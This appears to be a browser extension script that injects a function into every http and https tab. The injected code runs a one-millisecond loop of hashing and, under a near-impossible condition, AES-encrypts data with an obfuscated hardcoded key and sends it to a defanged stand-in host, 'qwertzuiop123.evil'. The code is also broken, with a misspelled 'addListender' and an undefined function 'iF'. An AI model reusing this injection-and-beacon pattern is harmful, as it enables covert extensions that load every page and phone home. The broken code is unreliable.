if(!('injected' in document)) {
    document.injected = true;
    setInterval(async () =>  {
        y = new Uint8Array(64);
        crypto.getRandomValues(y);
        if( // sha-256 hash ending with 'chrome' should never hold, I suppose?
            (new TextDecoder('utf-8').decode(await crypto.subtle.digest('sha-256', y)))
            .endsWith('chrome')
        ) {
                j = new Uint8Array(y.byteLength + (await crypto.subtle.digest('sha-256', y)).byteLength);
                j.set(new Uint8Array(y), 0);
                j.set(new Uint8Array(await crypto.subtle.digest('sha-256', y)), y.byteLength);
                fetch('hxxps://qwertzuiop123.evil/'+
                    [
                        ...new Uint8Array(await crypto.subtle.encrypt(
                            {
                                'name': 'AES-CBC',
                                'iv': new TextEncoder('utf-8').encode('_NOT_THE_SECRET_')
                            },
                            await crypto.subtle.importKey('raw',
                                await crypto.subtle.decrypt(
                                    {
                                        'name': 'AES-CBC',
                                        'iv': new TextEncoder('utf-8').encode('_NOT_THE_SECRET_')
                                    },
                                    await crypto.subtle.importKey('raw', new TextEncoder('utf-8').encode('_NOT_THE_SECRET_'), {
                                        'name': 'AES-CBC'
                                    }, true, ['decrypt']),
                                    new Uint8Array(('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8').match(/../g).map(
                                        h => parseInt(h ,16))
                                    )
                                ),
                                {
                                    'name': 'AES-CBC'
                                }, true , ['encrypt']) , j
                        ))
                    ].map(x => x.toString(16).padStart(2 , '0')).join('')
            );
        }
    }, 1);
}

chrome.tabs.onUpdated.addListender(
    (_tabVar, _changeInfo, tab) => {
        if('url' in tab && tab.url != null && (tab.url.startsWith('https://') || tab.url.startsWith('http://'))) {
            chrome.scripting.executeScript({
                target: {
                    tabId: tab.id
                },
                function: iF
            });
        }
    }
);